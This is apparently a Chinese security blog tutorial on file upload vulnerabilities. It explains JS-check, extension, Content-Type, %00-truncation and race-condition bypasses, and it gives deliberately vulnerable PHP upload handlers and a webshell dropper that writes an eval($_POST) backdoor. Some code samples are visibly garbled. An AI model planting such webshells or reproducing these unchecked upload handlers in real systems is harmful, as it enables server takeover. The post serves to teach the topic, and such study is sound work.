@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>文件上传漏洞 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="woejk0x&#39;s blogs">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="介绍在现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如企业的OA系统，允许用户上传图片视频、头像和许多其他类型的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如企业的OA系统，允许用户上传图片视频、头像和许多其他类型的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站的权限，或者进一步危害服务器。</p>
+<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="为什么文件上传存在漏洞"><a href="#为什么文件上传存在漏洞" class="headerlink" title="为什么文件上传存在漏洞"></a>为什么文件上传存在漏洞</h2><p>上传文件时，如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell 脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p>
+<h1 id="JS检测绕过攻击"><a href="#JS检测绕过攻击" class="headerlink" title="JS检测绕过攻击"></a>JS检测绕过攻击</h1><p>JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹框告知，此时上传文件的数据包并没有发送到服务端，只是在客户端浏览器使用JavaScript对数据包进行检测，如图所示。<br>![[Pasted image 20260202135452.png]]<br>这时有两种方法可以绕过客户端JavaScript的检测。</p>
+<ul>
+<li>使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。</li>
+<li>首先把需要上传文件的后缀改成允许上传的，如jpg、png等，绕过Js的检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功，如图所示。<br>![[Pasted image 20260202144245.png]]</li>
+</ul>
+<h1 id="JS检测绕过攻击分析"><a href="#JS检测绕过攻击分析" class="headerlink" title="JS检测绕过攻击分析"></a>JS检测绕过攻击分析</h1><p>客户端上传文件的HTML代码如下所示，在选择文件时，会调用JS的selectFile函数，函数的作用是先将文件名转换为小写，然后通过substr获取文件名最后一个点号后面的后缀（包括点号)。如果后缀不是“jpg”，则会弹框提示“请选择jpg格式的照片上传”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;JS 检查文件后缀&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	function selectFile(fnUpload)&#123;</span><br><span class="line">		var filename = fnUpload.value;</span><br><span class="line">		var mime = filename.toLowerCase().substr(filename.lastIndexOf(&quot;.&quot;));</span><br><span class="line">		if(mime!=&quot;.jpg&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			alert(&quot;请选择jpg格式的照片上传&quot;);</span><br><span class="line">			fnUpload.outerHTML=fnUpload.outerHTML;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;form action=&quot;upload2.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; onchange=&quot;selectFile(this)&quot; /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>服务端处理上传文件的代码如下所示。如果上传文件没出错，再通过file_exists判断在upload目录下文件是否已存在，不存在的话就通过move_uploaded_file将文件保存到upload目录。此PHP代码中没有对文件后缀做任何判断，所以只需要绕过前端JS的校验就可以上传WebShell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Return Code: &quot; . $_FILEs[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]. &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">			&#123;</span><br><span class="line">				echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			move_uploaded_file($_FILEs[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">			&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">			echo &quot;Stored in:&quot;. &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="文件后缀绕过攻击"><a href="#文件后缀绕过攻击" class="headerlink" title="文件后缀绕过攻击"></a>文件后缀绕过攻击</h1><p>文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果配置有如下代码，则能够解析php和phtml文件。<br><code>AddType application/x-httpd-php .php .phtml</code><br>所以，可以上传一个后缀为phtml的WebShell，如图所示。<br>![[Pasted image 20260202145443.png]]<br>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似1.php.xxxx，因为后缀xxxx不可以解析，所以向左解析后缀php，如图所示。<br>![[Pasted image 20260202145526.png]]</p>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>服务端处理上传文件的代码如下所示。通过函数pathinfo()获取文件后缀，将后缀转换为小写后，判断是不是“php”，如果上传文件的后缀是php，则不允许上传，所以此处可以通过利用Apache解析顺序或上传phtml等后缀的文件绕过该代码限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$info=pathinfo($_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">		$ext=$info[&#x27;extension&#x27;];//得到文件扩展名</span><br><span class="line">		if (strtolower($ext) == &quot;php&quot;) &#123;</span><br><span class="line">			exit(&quot;不允许的后缀名&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot; Kb&lt;br</span><br><span class="line">		echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;</span><br><span class="line">		if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">			&#123;</span><br><span class="line">			echo $_FILES[&quot;file&quot;l[&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">			&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">			echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name“];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="文件类型绕过攻击"><a href="#文件类型绕过攻击" class="headerlink" title="文件类型绕过攻击"></a>文件类型绕过攻击</h1><p>在客户端上传文件时通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中Content-Type的值是application&#x2F;octet-stream，而上传jpg格式的文件时，数据包中Content-Type的值是image&#x2F;jpeg，如图所示。<br>![[Pasted image 20260202150503.png]]<br>![[Pasted image 20260202150514.png]]<br>如果服务端代码是通过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值是通过客户端传递的，是可以任意修改的。所以当上传一个php文件时，在Burp Suite中将Content-Type修改为image&#x2F;jpeg，就可以绕过服务端的检测，如图所示。<br>![[Pasted image 20260202150550.png]]</p>
+<h1 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h1><p>服务端处理上传文件的代码如下所示，服务端代码判断<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>是不是图片的格式(image&#x2F;gif，image&#x2F;jpeg，image&#x2F;pjpeg)，如果不是，则不允许上传该文件，而<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>是客户端请求数据包中的Content-Type，所以可以通过修改Content-Type的值绕过该代码限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		if (($_FILES[&quot;file&quot;][&quot;type&quot;] != &quot;image/gif&quot;) &amp;&amp; ($_FILEs[&quot;file&quot;][&quot;type&quot;] !=</span><br><span class="line">&quot;image/jpeg&quot;)</span><br><span class="line">		&amp;&amp; ($_FILES[&quot;file&quot;][&quot;type&quot;] != &quot;image/pjpeg&quot;))&#123;</span><br><span class="line">		exit($_FILES[&quot;file&quot;][&quot;type&quot;]);</span><br><span class="line">		exit(&quot;不允许的格式&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">		echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/ 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">			&#123;</span><br><span class="line">			echo $_FILEs[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">			&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">			echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传，代码如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Return Code: &quot; . $FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">			if(!getimagesize($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</span><br><span class="line">				exit(&quot;不允许的文件&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">			&#123;</span><br><span class="line">			echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">			&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">			echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>但是，我们可以将一个图片和一个WebShell合并为一个文件，例如使用以下命令。<br><code>cat image.png webshell.php &gt; image.php</code><br>此时，使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。</p>
+<h1 id="文件阶段绕过攻击"><a href="#文件阶段绕过攻击" class="headerlink" title="文件阶段绕过攻击"></a>文件阶段绕过攻击</h1><p>截断类型：PHP %00截断。<br>截断原理：由于00代表结束符，所以会把00后面的所有字符删除。<br>截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态。<br>如图所示，在上传文件时，服务端将GET参数jieduan的内容作为上传后文件名的第一部分，然后将按时间生成的图片文件名作为上传后文件名的第二部分。<br>![[Pasted image 20260202155409.png]]<br>修改参数jieduan为1.php%00.jpg，文件被保存到服务器时，%00会把“jpg”和按时间生成的图片文件名全部截断，那么文件名就剩下1.php，因此成功上传了WebShell脚本，如图所示。<br>![[Pasted image 20260202155616.png]]</p>
+<h1 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h1><p>服务端处理上传文件的代码如下所示，程序使用substr获取文件的后缀，然后判断后缀是否是flv、swf、mp3、mp4、3gp、zip、rar、gif、jpg、png、bmp中的一种，如果不是，则不允许上传该文件。但是在保存的路径中有<code>$_REQUEST[&#39;jieduan&#39;]</code>，那么此处可以利用00截断尝试绕过服务端限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">	$ext_arr =</span><br><span class="line">array(&#x27;flv&#x27;,&#x27;swf&#x27;,&#x27;mp3&#x27;,&#x27;mp4&#x27;,&#x27;3gp&#x27;,&#x27;zip&#x27;,&#x27;rar&#x27;,&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;bmp&#x27;);</span><br><span class="line">	$file_ext =</span><br><span class="line">substr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">	if(in_array($file_ext,$ext_arr))</span><br><span class="line">	&#123;</span><br><span class="line">		$tempFile = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">		//这句话的$_REQUEST[&#x27;jieduan&#x27;]造成可以利用截断上传</span><br><span class="line">		$targetPath = &quot;upload/&quot;.$_REQUEST[&#x27;jieduan&#x27;].rand(10,</span><br><span class="line">99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">		if(move_uploaded_file($tempFile,$targetPath))</span><br><span class="line">		&#123;</span><br><span class="line">			echo &#x27;上传成功&#x27;.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">			echo &#x27;路径: &#x27;.$targetPath;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo(&quot;上传失败&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	echo(&quot;不允许的后缀”）;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在多数情况下，截断绕过都是用在文件名后面加上HEX形式的%00来测试，例如filename&#x3D;’1.php%00.jpg’，但是由于在php中，<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>在得到文件名时，%00之后的内容已经被截断了，所以<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>得到的后缀是php，而<br>不是php%00.jpg，因而此时不能通过<code>if(in_array($file_ext,$ext_arr))</code>的检查，如图所示。<br>![[Pasted image 20260202160300.png]]<br>![[Pasted image 20260202160311.png]]</p>
+<h1 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h1><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。<br>攻击者先上传一个WebShell脚本10.php，10.php的内容是生成一个新的WebShell脚本shell.php,10.php的代码如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&#x27;../shell.php&#x27;, &#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[a]) ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当10.php上传成功后，客户端立即访问10.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用时间差完成了WebShell的上传，如图所示。<br>![[Pasted image 20260202160621.png]]</p>
+<h1 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h1><p>程序获取文件<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>的代码如下所示，先判断upload目录下是否存在相同的文件，如果不存在，则直接上传文件，在判断文件是否为WebShell时，还有删除WebShell时，都是需要时间来执行的，如果我们能在删除文件前就访问该WebShell，那么会创建一个新的WebShell，从而绕过该代码限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;[&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Type: &quot; . $_FILEs[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Size: &quot; . ($_FILEs[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">		if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">			&#123;</span><br><span class="line">			echo $_FILES[&quot;file&quot;][&quot;name&quot;]. &quot; already exists.&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">			&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">			echo &quot;Stored in: &quot; . &quot;uplod/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">			//为了说明，这里利用sleep()函数让程序休眠10s</span><br><span class="line">			sleep(&quot;10&quot;);</span><br><span class="line">			//检查上传的文件是否是WebShell，如果是，则删除</span><br><span class="line">			unlink(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
